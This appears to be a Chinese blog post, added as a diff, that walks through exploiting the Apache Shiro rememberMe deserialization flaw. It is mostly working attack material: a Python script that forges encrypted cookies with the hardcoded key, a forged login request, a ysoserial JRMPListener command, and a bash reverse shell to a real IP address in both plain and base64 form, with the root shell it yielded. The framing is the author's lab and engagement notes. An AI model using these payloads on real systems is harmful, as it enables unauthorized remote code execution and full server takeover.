@@ -1,0 +1,132 @@
+<blockquote>
+  <p>漏洞特征：shiro反序列化的特征：1、在返回包的Set-Cookie的值为「rememberMe=deleteMe」2、Apache Shiro版本&lt;= 1.2.4
+现在很多j2ee开发都会采用shiro框架来做一些权限控制，框架的优势是出来了，当然就存在劣势。shiro是我在参加工作后才会慢慢去接触到，从一开始的代审，再到黑盒渗透，再到前一段时间刚结束的HW行动。
+第一小结，是我自己在实践中的一些理解和经历，希望能够记录下来；第二小结是在学习中在网上的一些学习过程，当时也记录下来了，故此分为两个小结。</p>
+</blockquote>
+
+<h1 id="验证">验证</h1>
+<p>在上面的简述中，可以来进行shiro框架的判断，同时，我们可以进一步对shiro框架是否存在反序列化来进行验证：
+用到的是<a href="http://www.svenbeast.com/post/tskRKJIPg/">Shiroscan</a>脚本，开源在github上，用法就不多赘述。</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 shiro_rce.py https://shiro.vuln.ip/login.html <span class="s2">"ping x.dnslog.cn"</span>
+ ____  _     _          ____                  
+/ ___|| |__ <span class="o">(</span>_<span class="o">)</span>_ __ ___/ ___|  ___ __ _ _ __  
+<span class="se">\_</span>__ <span class="se">\|</span> <span class="s1">'_ \| | '</span>__/ _ <span class="se">\_</span>__ <span class="se">\ </span>/ __/ _<span class="sb">`</span> | <span class="s1">'_ \ 
+ ___) | | | | | | | (_) |__) | (_| (_| | | | |
+|____/|_| |_|_|_|  \___/____/ \___\__,_|_| |_|
+
+                           By 斯文
+
+Welcome To Shiro反序列化 RCE ! 
+[*]  开始检测模块 Class1:CommonsBeanutils1
+</span></code></pre></div></div>
+<p>然后脚本开始对不同的秘钥进行生成cookie，尝试让机器执行命令。等待脚本在跑的时候或者跑完，看一下dnslog上的dns记录，如果存在记录如下所示，那么就说明存在反序列化漏洞使得机器执行了任意代码，反之则无：</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">x</span><span class="p">.</span><span class="nx">dnslog</span><span class="p">.</span><span class="nx">cn</span>    <span class="nx">shiro</span><span class="p">.</span><span class="nx">vuln</span><span class="p">.</span><span class="nx">ip</span> <span class="mi">2020</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">02</span> <span class="mi">16</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span><span class="mi">35</span>
+<span class="nx">x</span><span class="p">.</span><span class="nx">dnslog</span><span class="p">.</span><span class="nx">cn</span>    <span class="nx">shiro</span><span class="p">.</span><span class="nx">vuln</span><span class="p">.</span><span class="nx">ip</span> <span class="mi">2020</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">02</span> <span class="mi">16</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">52</span>
+<span class="nx">x</span><span class="p">.</span><span class="nx">dnslog</span><span class="p">.</span><span class="nx">cn</span>    <span class="nx">shiro</span><span class="p">.</span><span class="nx">vuln</span><span class="p">.</span><span class="nx">ip</span> <span class="mi">2020</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">02</span> <span class="mi">16</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">52</span>
+<span class="nx">x</span><span class="p">.</span><span class="nx">dnslog</span><span class="p">.</span><span class="nx">cn</span>    <span class="nx">shiro</span><span class="p">.</span><span class="nx">vuln</span><span class="p">.</span><span class="nx">ip</span> <span class="mi">2020</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">02</span> <span class="mi">16</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">52</span>
+</code></pre></div></div>
+<h2 id="不服气">不服气</h2>
+<p>当然有的时候用shiroScan扫结束后并没有记录，即不存在漏洞；但是像我，又不死心，于是又在网上折腾找了另外一个能够跑秘钥的探测脚本-_-
+<a href="https://www.bacde.me/post/Apache-Shiro-Deserialize-Vulnerability/">作者博客</a></p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">python</span> <span class="nx">shiro_exp</span><span class="p">.</span><span class="nx">py</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//shiro.vuln.ip/login.html</span>
+<span class="k">try</span> <span class="nx">CipherKey</span> <span class="p">:</span><span class="mi">4</span><span class="nx">AvVhmFLUs0KTA3Kprsdag</span><span class="o">==</span>
+<span class="nx">generator</span> <span class="nx">payload</span> <span class="nx">done</span><span class="p">.</span>
+<span class="nx">send</span> <span class="nx">payload</span> <span class="nx">ok</span><span class="p">.</span>
+<span class="nx">checking</span><span class="p">.....</span>
+<span class="nx">checking</span><span class="p">.....</span>
+<span class="nx">checking</span><span class="p">.....</span>
+<span class="nx">checking</span><span class="p">.....</span>
+<span class="nx">vulnerable</span><span class="p">:</span><span class="kc">true</span> <span class="nx">url</span><span class="p">:</span><span class="nx">https</span><span class="p">:</span><span class="c1">//shiro.vuln.ip/login.html    CipherKey:3AvVhmFLUs0KTA3Kprsdag==</span>
+</code></pre></div></div>
+<p>当然秘钥对于我们理解shiro反序列化框架也有一定的帮助，shiro的反序列化最初的漏洞来源也是因为秘钥硬编码。</p>
+
+<h2 id="getshell">getshell</h2>
+<p>通过上面的步骤我们就可以对shiro反序列化做一个判定，肯定是存在RCE漏洞，那么来实现我们的最终目的，GET-shell
+一般反弹shell的执行代码<code class="language-plaintext highlighter-rouge">bash -i &gt;&amp; /dev/tcp/47.52.233.92/11111 0&gt;&amp;1</code>，首先需要把代码进行base64编码，只有经过base64编码后shiro才认得这个命令，通过shiro自己本身的base64解码最终达到执行命令的目的；
+转成base64编码-&gt;<code class="language-plaintext highlighter-rouge">bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny41Mi4yMzMuOTIvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}</code>；像我比较偷懒，就直接在脚本上添加反弹shell，这样的好处就是我们不需要在生成poc的脚本里替换cookie，由脚本自动生成的cookie自动去跑，省事很多
+来源：<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">我是转换网址:-)</a>
+监听端口等待shell回连（我这里的样例是docker环境）</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">nc</span> <span class="o">-</span><span class="nx">lvvp</span> <span class="mi">11111</span>
+<span class="nx">Listening</span> <span class="nx">on</span> <span class="p">[</span><span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">]</span> <span class="p">(</span><span class="nx">family</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">port</span> <span class="mi">11111</span><span class="p">)</span>
+<span class="nx">Connection</span> <span class="k">from</span> <span class="mf">59.110</span><span class="p">.</span><span class="mf">152.168</span> <span class="mi">47274</span> <span class="nx">received</span><span class="o">!</span>
+<span class="nx">bash</span><span class="p">:</span> <span class="nx">cannot</span> <span class="kd">set</span> <span class="nx">terminal</span> <span class="nx">process</span> <span class="nx">group</span> <span class="p">(</span><span class="mi">1</span><span class="p">):</span> <span class="nx">Inappropriate</span> <span class="nx">ioctl</span> <span class="k">for</span> <span class="nx">device</span>
+<span class="nx">bash</span><span class="p">:</span> <span class="nx">no</span> <span class="nx">job</span> <span class="nx">control</span> <span class="k">in</span> <span class="k">this</span> <span class="nx">shell</span>
+<span class="nx">root</span><span class="p">@</span><span class="nd">6d5a7848dbef</span><span class="p">:</span><span class="o">/</span><span class="err">#</span> <span class="nx">id</span>
+<span class="nx">id</span>
+<span class="nx">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="nx">root</span><span class="p">)</span> <span class="nx">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="nx">root</span><span class="p">)</span> <span class="nx">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="nx">root</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h1 id="学习">学习</h1>
+<h2 id="工具">工具</h2>
+<p>使用ysoserial进行流量监听，下面是ysoserial的jar包生成，懂得开发同学都懂。</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">git</span> <span class="nx">clone</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//github.com/frohoff/ysoserial.git</span>
+<span class="nx">cd</span> <span class="nx">ysoserial</span>
+<span class="nx">mvn</span> <span class="kr">package</span> <span class="o">-</span><span class="nx">D</span> <span class="nx">skipTests</span>
+</code></pre></div></div>
+<h2 id="how-to-poc">how-to-poc</h2>
+<p>使用poc代码获得对应的rememberMe的cookie值。</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">#</span> <span class="o">-*-</span> <span class="nx">coding</span><span class="p">:</span><span class="nx">utf</span><span class="o">-</span><span class="mi">8</span> <span class="o">-*-</span>
+<span class="k">import</span> <span class="nx">sys</span>
+<span class="k">import</span> <span class="nx">uuid</span>
+<span class="k">import</span> <span class="nx">base64</span>
+<span class="k">import</span> <span class="nx">subprocess</span>
+<span class="k">from</span> <span class="nx">Crypto</span><span class="p">.</span><span class="nx">Cipher</span> <span class="k">import</span> <span class="nx">AES</span>
+
+<span class="nx">def</span> <span class="nx">encode_rememberme</span><span class="p">(</span><span class="nx">command</span><span class="p">):</span>
+    <span class="nx">popen</span> <span class="o">=</span> <span class="nx">subprocess</span><span class="p">.</span><span class="nx">Popen</span><span class="p">([</span><span class="dl">'</span><span class="s1">java</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">-jar</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">ysoserial-0.0.6-SNAPSHOT-all.jar</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">JRMPClient</span><span class="dl">'</span><span class="p">,</span> <span class="nx">command</span><span class="p">],</span> <span class="nx">stdout</span><span class="o">=</span><span class="nx">subprocess</span><span class="p">.</span><span class="nx">PIPE</span><span class="p">)</span>
+    <span class="nx">BS</span> <span class="o">=</span> <span class="nx">AES</span><span class="p">.</span><span class="nx">block_size</span>
+    <span class="nx">pad</span> <span class="o">=</span> <span class="nx">lambda</span> <span class="nx">s</span><span class="p">:</span> <span class="nx">s</span> <span class="o">+</span> <span class="p">((</span><span class="nx">BS</span> <span class="o">-</span> <span class="nx">len</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="o">%</span> <span class="nx">BS</span><span class="p">)</span> <span class="o">*</span> <span class="nx">chr</span><span class="p">(</span><span class="nx">BS</span> <span class="o">-</span> <span class="nx">len</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="o">%</span> <span class="nx">BS</span><span class="p">)).</span><span class="nx">encode</span><span class="p">()</span>
+    <span class="nx">key</span> <span class="o">=</span> <span class="nx">base64</span><span class="p">.</span><span class="nx">b64decode</span><span class="p">(</span><span class="dl">"</span><span class="s2">kPH+bIxk5D2deZiIxcaaaA==</span><span class="dl">"</span><span class="p">)</span>
+    <span class="nx">iv</span> <span class="o">=</span> <span class="nx">uuid</span><span class="p">.</span><span class="nx">uuid4</span><span class="p">().</span><span class="nx">bytes</span>
+    <span class="nx">encryptor</span> <span class="o">=</span> <span class="nx">AES</span><span class="p">.</span><span class="k">new</span><span class="p">(</span><span class="nx">key</span><span class="p">,</span> <span class="nx">AES</span><span class="p">.</span><span class="nx">MODE_CBC</span><span class="p">,</span> <span class="nx">iv</span><span class="p">)</span>
+    <span class="nx">file_body</span> <span class="o">=</span> <span class="nx">pad</span><span class="p">(</span><span class="nx">popen</span><span class="p">.</span><span class="nx">stdout</span><span class="p">.</span><span class="nx">read</span><span class="p">())</span>
+    <span class="nx">base64_ciphertext</span> <span class="o">=</span> <span class="nx">base64</span><span class="p">.</span><span class="nx">b64encode</span><span class="p">(</span><span class="nx">iv</span> <span class="o">+</span> <span class="nx">encryptor</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">(</span><span class="nx">file_body</span><span class="p">))</span>
+    <span class="k">return</span> <span class="nx">base64_ciphertext</span>
+
+<span class="k">if</span> <span class="nx">__name__</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">__main__</span><span class="dl">'</span><span class="p">:</span>
+    <span class="nx">payload</span> <span class="o">=</span> <span class="nx">encode_rememberme</span><span class="p">(</span><span class="nx">sys</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>    
+<span class="nx">print</span> <span class="dl">"</span><span class="s2">rememberMe={0}</span><span class="dl">"</span><span class="p">.</span><span class="nx">format</span><span class="p">(</span><span class="nx">payload</span><span class="p">.</span><span class="nx">decode</span><span class="p">())</span>
+</code></pre></div></div>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">D</span><span class="p">:</span><span class="err">\</span><span class="nx">bin4xin</span><span class="err">\</span><span class="nx">code</span><span class="err">\</span><span class="nx">shiro</span><span class="err">\</span><span class="nx">shrio</span><span class="o">-</span><span class="nx">poc</span><span class="err">\</span><span class="nx">ysoserial</span><span class="err">\</span><span class="nx">target</span><span class="o">&gt;</span> <span class="nx">python</span> <span class="p">.</span><span class="err">\</span><span class="nx">shrio</span><span class="o">-</span><span class="nx">poc</span><span class="p">.</span><span class="nx">py</span> <span class="mf">47.52</span><span class="p">.</span><span class="mf">233.92</span><span class="p">:</span><span class="mi">6666</span>
+<span class="nx">rememberMe</span><span class="o">=</span><span class="nx">W8BOhPe8Qdy8FJ5N9genqt4WjZaONr1NQ</span><span class="o">+</span><span class="nx">dXgDCV1RrGHUwMfd8ljlA9AG64t7vzUesOp7YKsz6EFFHgyrq1qRqUiPFBnEBi</span><span class="o">/</span><span class="nx">NNNpE2UR8CgMsf1KY2rbBurFv1Gwslv2</span><span class="o">+</span><span class="nx">SL7hy3YNq9cpPWm5S8o</span><span class="o">+</span><span class="nx">nJpa6IyI9cZ</span><span class="o">+</span><span class="nx">n7a</span><span class="o">+</span><span class="mi">6</span><span class="nx">hjB4Yfnf89u3BLi4AxOXL35SotH2AdSX2iZrWgGAcah9oW21JwpC2zj4YMjsGf2tPYUysP873bYYHuSIohaXf3bcq4YuQajMctVmM3IvjeY5Ggva9QRUvo5B1o0sPNHdXGwn</span><span class="o">/</span><span class="nx">z9t</span><span class="o">/</span><span class="nx">KWcSeTWE</span><span class="o">+</span><span class="nx">Dt2f95a9QjEIoic6s88Tv0SKjY6UdCmTxN3vVE8rs1haiA48R1CuUQQiWa9V28m2qkonX9aUEUl4kTGGvF</span><span class="o">+</span><span class="nx">Y5eB4MaNTw</span><span class="o">==</span>
+</code></pre></div></div>
+
+<p>抓包，前台登录拦包，勾选<code class="language-plaintext highlighter-rouge">Remember Me</code>，截获数据包，替换cookie构造数据包：</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">POST</span> <span class="o">/</span><span class="nx">doLogin</span> <span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="nx">underattack</span><span class="o">-</span><span class="nx">host</span><span class="p">:</span> <span class="nx">underattack</span><span class="o">-</span><span class="nx">host</span><span class="p">:</span><span class="mi">8080</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="p">:</span> <span class="mi">55</span>
+<span class="nx">Cache</span><span class="o">-</span><span class="nx">Control</span><span class="p">:</span> <span class="nx">max</span><span class="o">-</span><span class="nx">age</span><span class="o">=</span><span class="mi">0</span>
+<span class="nx">Origin</span><span class="p">:</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//underattack-host:8080</span>
+<span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="p">:</span> <span class="mi">1</span>
+<span class="nx">DNT</span><span class="p">:</span> <span class="mi">1</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="p">:</span> <span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="p">:</span> <span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="nx">Windows</span> <span class="nx">NT</span> <span class="mf">10.0</span><span class="p">;</span> <span class="nx">Win64</span><span class="p">;</span> <span class="nx">x64</span><span class="p">)</span> <span class="nx">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span> <span class="p">(</span><span class="nx">KHTML</span><span class="p">,</span> <span class="nx">like</span> <span class="nx">Gecko</span><span class="p">)</span> <span class="nx">Chrome</span><span class="o">/</span><span class="mf">81.0</span><span class="p">.</span><span class="mf">4044.138</span> <span class="nx">Safari</span><span class="o">/</span><span class="mf">537.36</span>
+<span class="nx">Accept</span><span class="p">:</span> <span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">webp</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">apng</span><span class="p">,</span><span class="o">*</span><span class="cm">/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://underattack-host:8080/login
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: rememberMe=RFUadguvSoq4kMm3ZwnkO/MHiokCrqrCURXUqUWaXLBM7/fBF65qvjWDFZeh49zHDRm5oKPU1AhmbEBaYRp3ASrQpHdp7mYrChOi51tmq9qkzWemDnjbUXtp8B6RF1EUNV2q2tKaKlf4AAR1hZIRJGbz4CpLeumNAeWB98f6/T0GaWJGGve9rP6l9/7iU5Y9Xj4ZmSBP6LgMHYF3TJ2DDdTNI4nPITeQI3S+9ol/BmT14Be5m0ENfOkm1cdm3L8Rj/pbeE842Y3nUioEdAXizCrOsCYT+u2QTWHt1YZLmB/xsfQvEV5bRpRJeRv/ps7V00PiXvCeaPQoDs541wqB75+/RRAdqU8TWnJE7YhvQVkxTRLvCjBTtwfkgA3XVA8X+518nh0wSoj8/Ajaoi5MbA==
+Connection: close
+
+username=asdmnin&amp;password=asdasd&amp;rememberme=remember-me
+</span></code></pre></div></div>
+<p>使用包监听6666端口：</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">iZj6cgn7odv59wmjjhe6zwZ</span><span class="p">:</span><span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">tool</span><span class="o">/</span><span class="nx">shiro_poc</span><span class="o">/</span><span class="nx">POC</span><span class="o">-</span><span class="mi">2</span><span class="o">/</span><span class="nx">ysoserial</span><span class="o">/</span><span class="nx">target</span><span class="err">#</span> <span class="nx">java</span> <span class="o">-</span><span class="nx">cp</span> <span class="nx">ysoserial</span><span class="o">-</span><span class="mf">0.0</span><span class="p">.</span><span class="mi">6</span><span class="o">-</span><span class="nx">SNAPSHOT</span><span class="o">-</span><span class="nx">all</span><span class="p">.</span><span class="nx">jar</span> <span class="nx">ysoserial</span><span class="p">.</span><span class="nx">exploit</span><span class="p">.</span><span class="nx">JRMPListener</span> <span class="mi">6666</span> <span class="nx">CommonsCollections4</span> <span class="dl">'</span><span class="s1">bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny41Mi4yMzMuOTIvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}</span><span class="dl">'</span>
+<span class="o">*</span> <span class="nx">Opening</span> <span class="nx">JRMP</span> <span class="nx">listener</span> <span class="nx">on</span> <span class="mi">6666</span>
+</code></pre></div></div>
+<p>发包，我们看到jrmp监听的端口已经有流量回流回来了，如下：</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Have</span> <span class="nx">connection</span> <span class="k">from</span> <span class="sr">/underattack-host:5827</span><span class="err">2
+</span><span class="nx">Reading</span> <span class="nx">message</span><span class="p">...</span>
+<span class="nx">Is</span> <span class="nx">DGC</span> <span class="nx">call</span> <span class="k">for</span> <span class="p">[[</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span> <span class="mi">356978429</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2006635131</span><span class="p">]]</span>
+<span class="nx">Sending</span> <span class="k">return</span> <span class="kd">with</span> <span class="nx">payload</span> <span class="k">for</span> <span class="nx">obj</span> <span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">]</span>
+<span class="nx">Closing</span> <span class="nx">connection</span>
+<span class="nx">Have</span> <span class="nx">connection</span> <span class="k">from</span> <span class="sr">/underattack-host:5827</span><span class="err">4
+</span><span class="nx">Reading</span> <span class="nx">message</span><span class="p">...</span>
+<span class="nx">Is</span> <span class="nx">DGC</span> <span class="nx">call</span> <span class="k">for</span> <span class="p">[[</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span> <span class="mi">356978429</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1104978848</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2006635131</span><span class="p">]]</span>
+<span class="nx">Sending</span> <span class="k">return</span> <span class="kd">with</span> <span class="nx">payload</span> <span class="k">for</span> <span class="nx">obj</span> <span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">]</span>
+<span class="nx">Closing</span> <span class="nx">connection</span>
+</code></pre></div></div>
+
+<p>以上。</p>
+
